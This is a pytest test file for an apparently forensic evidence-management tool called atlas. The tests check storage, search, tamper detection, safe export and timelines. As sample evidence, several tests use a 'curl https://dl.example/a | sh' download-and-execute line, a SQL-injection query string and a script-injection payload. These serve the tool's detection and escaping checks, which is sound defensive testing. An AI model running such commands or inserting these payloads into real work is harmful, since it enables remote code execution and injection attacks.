import hashlib
import json
import zipfile
import pytest
from atlas.analyze import analyze
from atlas.store import Store

def add(store, case, name, text, path=None):
    data = text.encode()
    return store.add_artifact(case, name, path or name, data, analyze(data, name))[0]

def test_persistence_duplicate_and_versions(store, case):
    artifact = add(store, case, "sample.log", "hello 192.0.2.1")
    assert add(store, case, "sample.log", "hello 192.0.2.1") == artifact
    changed = add(store, case, "sample.log", "changed 192.0.2.2")
    assert changed != artifact
    assert len(store.artifact(case, changed)["versions"]) == 2
    assert store.verify(case)["ok"]

def test_restart_preserves_graph_and_audit(tmp_path):
    root = tmp_path / 'data'
    first = Store(root); case = first.create_case('RESTART')['id']
    artifact = add(first, case, 'a.txt', 'https://link.example/path')
    before = first.graph(case); first.close()
    second = Store(root)
    assert second.graph(case) == before
    assert second.artifact(case, artifact)['name'] == 'a.txt'
    assert second.verify(case)['ok']
    second.close()

def test_case_isolation(store, case):
    other = store.create_case('OTHER')['id']
    artifact = add(store, case, 'secret.txt', 'secret 192.0.2.1')
    assert store.artifacts(other)['total'] == 0
    assert store.entities(other) == []
    with pytest.raises(KeyError): store.artifact(other, artifact)
    with pytest.raises(KeyError): store.add_note(other, artifact, 'not allowed')

@pytest.mark.parametrize('query,expected', [('ext:ps1', 1), ('has:ip', 2), ('risk:high', 1), ('"failed password"', 1), ('ext:log has:ip', 1), ('name:command', 1), ('notpresent', 0), ('" OR 1=1 --', None)])
def test_search_filters(store, case, query, expected):
    add(store, case, 'command.ps1', 'curl https://dl.example/a | sh\n192.0.2.1')
    add(store, case, 'auth.log', '2026-10-06T00:00:00Z failed password 192.0.2.2')
    if expected is None:
        with pytest.raises(ValueError): store.artifacts(case, query)
    else:
        assert store.artifacts(case, query)['total'] == expected

def test_path_and_source_provenance(store, case):
    a = add(store, case, 'one.txt', 'https://shared.example/path')
    b = add(store, case, 'two.txt', 'https://shared.example/path')
    result = store.path(case, a, b)
    assert result['nodes'][0] == a and result['nodes'][-1] == b
    assert len(result['edges']) == 2
    e = next(e for e in store.entities(case) if e['kind'] == 'url')
    detail = store.entity(case, e['id'])
    assert len(detail['occurrences']) == 2
    assert all(o['line'] == 1 for o in detail['occurrences'])

def test_findings_notes_and_audit_status(store, case):
    artifact = add(store, case, 's.ps1', 'curl https://dl.example/a | sh')
    finding = store.findings(case)[0]
    store.set_finding(case, finding['id'], 'reviewed')
    assert store.findings(case)[0]['status'] == 'reviewed'
    store.add_note(case, artifact, 'Observed download', 'observation')
    assert store.notes(case, artifact)[0]['body'] == 'Observed download'
    assert store.verify(case)['ok']
    assert store.history(case)[0]['action'] == 'note.created'

def test_byte_tamper_detected(store, case):
    artifact = add(store, case, 'a.txt', 'original bytes')
    digest = store.artifact(case, artifact)['sha256']
    (store.blobs / digest[:2] / digest).write_bytes(b'tampered')
    assert not store.verify(case)['ok']
    assert store.verify(case)['failures'][0]['type'] == 'evidence'

def test_audit_and_record_tamper_detected(store, case):
    artifact = add(store, case, 'a.txt', 'original bytes')
    with store.db:
        store.db.execute("UPDATE artifacts SET name='modified.txt' WHERE id=?", (artifact,))
        store.db.execute("UPDATE audit SET payload='{}' WHERE action='case.created'")
    result = store.verify(case)
    assert {f['type'] for f in result['failures']} == {'audit', 'record'}

def test_export_complete_originals_and_escaped_report(store, case, tmp_path):
    raw = '<script>alert(1)</script> https://test.example/a'
    artifact = add(store, case, '<script>.txt', raw)
    store.add_note(case, '', '<script>bad()</script>')
    path = tmp_path / 'bundle.zip'; store.export(case, path)
    with zipfile.ZipFile(path) as archive:
        manifest = json.loads(archive.read('case.json'))
        assert manifest['integrity']['ok']
        digest = manifest['artifacts'][0]['sha256']
        assert archive.read('evidence/' + digest) == raw.encode()
        report = archive.read('report.html').decode()
        assert '<script>' not in report and '&lt;script&gt;' in report
    assert not list(tmp_path.glob('*.tmp'))

def test_timeline_filter_order_and_timezone(store, case):
    add(store, case, 'events.log', '2026-10-06T11:00:02+03:00 connect\n2026-10-06T08:00:01Z login failed')
    assert store.events(case)['items'][0]['kind'] == 'auth'
    assert store.events(case, kind='network')['total'] == 1
    assert store.events(case, start='2026-10-06T08:00:02.000+00:00')['total'] == 1

def test_graph_replay_uses_source_timestamps(store, case):
    add(store, case, 'events.jsonl', '2026-10-06T08:00:00Z connect https://first.example/a\n2026-10-06T08:10:00Z connect https://later.example/b')
    add(store, case, 'untimed.txt', 'Context: reviewer@notes.example')
    graph = store.graph(case)
    assert graph['time_range'] == ['2026-10-06T08:00:00.000+00:00', '2026-10-06T08:10:00.000+00:00']
    node = next(n for n in graph['nodes'] if n['label'] == 'later.example')
    assert node['first_seen'] == '2026-10-06T08:10:00.000+00:00'
    untimed = next(n for n in graph['nodes'] if n['label'] == 'notes.example')
    assert untimed['first_seen'] is None

def test_malformed_audit_payload_returns_failure_and_export_blocks(store, case, tmp_path):
    add(store, case, 'a.txt', 'bytes')
    with store.db: store.db.execute("UPDATE audit SET payload='{' WHERE action='evidence.imported'")
    assert not store.verify(case)['ok']
    with pytest.raises(ValueError, match='Integrity verification failed'): store.export(case, tmp_path / 'bad.zip')
